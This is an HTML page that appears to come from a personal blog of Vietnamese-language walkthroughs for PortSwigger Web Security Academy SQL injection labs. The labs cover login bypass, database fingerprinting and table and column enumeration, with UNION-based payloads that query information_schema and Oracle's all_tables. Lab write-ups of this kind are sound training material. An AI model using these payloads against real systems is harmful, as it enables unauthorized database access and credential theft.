@@ -1,0 +1,1786 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/SQL%20injection/">
+      
+      
+        <link rel="prev" href="../Server%20side%20template%20injection/">
+      
+      
+        <link rel="next" href="../SSRF/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>SQL Injection - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="sql-injection">SQL injection<a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h1>
+<h1 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><strong>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</strong><a class="headerlink" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Web Security Academy</a></p>
+<ul>
+<li>Ở đây, câu lệnh thực thi sẽ có dạng <code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code> và chúng ta kiểm soát được input trong dấu nháy.</li>
+<li>Thử với dấu <code>'</code> thì response trả về <code>500</code> và <code>''</code> response trả về <code>200</code> ⇒ có thể có SQLi</li>
+<li>
+<p>Thử truyền payload sau, nhân thấy response trả về là những sản phẩm chưa được phát hành ⇒ hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image.png" /></p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-vulnerability-allowing-login-bypass"><strong>Lab: SQL injection vulnerability allowing login bypass</strong><a class="headerlink" href="#lab-sql-injection-vulnerability-allowing-login-bypass" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">Lab: SQL injection vulnerability allowing login bypass | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, kiểm tra tại param <code>password</code> thử truyển dấu <code>'</code> thì server trả về <code>500</code>, <code>''</code> thì server trả về <code>200</code> ⇒ khả năng có SQLi</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+<li>
+<p>Thực truyền biểu thức logic như sau, nhận thấy có thể login thành công với tài khoản <code>administrator</code> . Hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle"><strong>Lab: SQL injection attack, querying the database type and version on Oracle</strong><a class="headerlink" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">Lab: SQL injection attack, querying the database type and version on Oracle | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, điều hướng đến chức năng tìm kiếm theo loại (ví dụ <code>Accessory</code>)</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện kiểm tra SQLi với request gửi tới API <code>GET /filter</code> tại tham số <code>category</code> . Với dấu <code>'</code> server trả về <code>500</code>, với <code>''</code> server trả về <code>200</code> ⇒ có khả năng có SQLi.</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+<li>
+<p>Vì ở đây, dữ liệu của truy vấn trả về ⇒ có thể dùng <code>UNION</code> để select được version qua đó giải lab thành công. Tuy nhiên, ở đây câu truy vấn gốc select 2 cột nên cần thêm một cột null, nếu thiếu sẽ gây lỗi</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft"><strong>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</strong><a class="headerlink" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, điều hướng đến chức năng tìm kiếm theo loại (ví dụ <code>Accessory</code>)</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện kiểm tra SQLi với request gửi tới API <code>GET /filter</code> tại tham số <code>category</code> . Với dấu <code>'</code> server trả về <code>500</code>, với <code>''</code> server trả về <code>200</code> ⇒ có khả năng có SQLi.</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+<li>
+<p>Ở đây, nếu payload mình truyền vào không có dấu space ở cuối thì sẽ bị <code>500</code> ⇒ MySQL</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+<li>
+<p>Thực hiện tìm số côt ⇒ 2 cột</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+<li>
+<p>Thực hiện lấy version, hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases"><strong>Lab: SQL injection attack, listing the database contents on non-Oracle databases</strong><a class="headerlink" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">Lab: SQL injection attack, listing the database contents on non-Oracle databases | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện test xem có SQLi bằng cách thử dấu nháy</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+<li>
+<p>Thực hiện dùng <code>UNION</code> để xác định Database version, số cột, dạng cột. Từ response trả về suy ra câu lệnh gốc truy vấn 2 cột đều có dạng string, và sử dụng Database <strong>PostgreSQL</strong></p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+<li>
+<p>Enum tên bảng bằng lệnh sau</p>
+<div class="highlight"><pre><span></span><code><span class="nx">Accessories</span><span class="err">&#39;</span><span class="w"> </span><span class="nx">union</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="p">(</span><span class="nx">SELECT</span><span class="w"> </span><span class="nx">table_name</span><span class="w"> </span><span class="nx">FROM</span><span class="w"> </span><span class="nx">information_schema</span><span class="p">.</span><span class="nx">tables</span><span class="w"> </span><span class="nx">limit</span><span class="w"> </span><span class="mf">1</span><span class="p">),</span><span class="kc">null</span><span class="o">--</span><span class="w"> </span>
+</code></pre></div>
+<ul>
+<li>
+<p>Trong trường hợp muốn enum bảng khác có thể dùng lệnh sau:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">Accessories</span><span class="err">&#39;</span><span class="w"> </span><span class="nx">union</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="p">(</span><span class="nx">SELECT</span><span class="w"> </span><span class="nx">table_name</span><span class="w"> </span><span class="nx">FROM</span><span class="w"> </span><span class="nx">information_schema</span><span class="p">.</span><span class="nx">tables</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">table_name</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">users_ljpekn</span><span class="w"> </span><span class="nx">limit</span><span class="w"> </span><span class="mf">1</span><span class="p">),</span><span class="kc">null</span><span class="o">--</span><span class="w"> </span>
+</code></pre></div>
+</li>
+</ul>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+<li>
+<p>Tiếp theo cần enum tên cột ⇒  sử dụng câu lệnh sau để lấy được cột lưu username, password</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; AND 1=0 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = &#39;</span><span class="nx">users_ljpekn</span><span class="err">&#39;</span><span class="w"> </span><span class="nx">LIMIT</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">OFFSET</span><span class="w"> </span><span class="mf">2</span><span class="o">--</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; AND 1=0 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = &#39;</span><span class="nx">users_ljpekn</span><span class="err">&#39;</span><span class="w"> </span><span class="nx">LIMIT</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">OFFSET</span><span class="w"> </span><span class="mf">1</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2027.png" /></p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+<li>
+<p>Thực hiện lấy password và hoàn thành lab</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle"><strong>Lab: SQL injection attack, listing the database contents on Oracle</strong><a class="headerlink" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">Lab: SQL injection attack, listing the database contents on Oracle | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện test có SQLi không bằng nháy</p>
+<p><img alt="image.png" src="image%2031.png" /></p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+</li>
+<li>
+<p>Tiếp theo là xác định database type, column type → Oracle và cả 2 cột trong câu truy vấn gốc là dạng string</p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+<p><img alt="image.png" src="image%2034.png" /></p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+<li>
+<p>Tiếp theo là xác định tên tables là <code>USERS_ENGYTN</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">Accessories</span><span class="s1">&#39; union select table_name,&#39;</span><span class="nx">aa</span><span class="err">&#39;</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="nx">all_tables</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2036.png" /></p>
+</li>
+<li>
+<p>Sau đó thì enum cột</p>
+<div class="highlight"><pre><span></span><code><span class="nx">Accessories</span><span class="s1">&#39; union select column_name,&#39;</span><span class="nx">aa</span><span class="s1">&#39; from all_tab_columns  where table_name=&#39;</span><span class="nx">USERS_ENGYTN</span><span class="err">&#39;</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2037.png" /></p>
+</li>
+<li>
+<p>Cuối cùng, thực hiện lấy account administrator. Đăng nhập bằng account lấy được và hoàn thành lab</p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query"><strong>Lab: SQL injection UNION attack, determining the number of columns returned by the query</strong><a class="headerlink" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">Lab: SQL injection UNION attack, determining the number of columns returned by the query | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết kiểm tra có SQLi không</p>
+<p><img alt="image.png" src="image%2040.png" /></p>
+<p><img alt="image.png" src="image%2041.png" /></p>
+</li>
+<li>
+<p>Xác định database type, số lượng cột. Sử dụng <code>' or '1'='1'--</code> để loại <strong>MySQL</strong>  và db khác → db khác. Tiếp theo thử <code>' or '1'=()--</code>  trong ngoặc sẽ chọn các câu select version khác nhau để xác định db. Cuối cùng xác định được db là <strong>PosgreSQL</strong></p>
+<p><img alt="image.png" src="image%2042.png" /></p>
+<p><img alt="image.png" src="image%2043.png" /></p>
+<p><img alt="image.png" src="image%2044.png" /></p>
+</li>
+<li>
+<p>Cuối cùng xác định số lượng cột bằng cách sau (thay đổi số lượng null đến khi status code trả về 200). Suy ra có 3 cột. Hoàn thành việc giải lab.</p>
+<p><img alt="image.png" src="image%2045.png" /></p>
+<p><img alt="image.png" src="image%2046.png" /></p>
+</li>
+</ul>
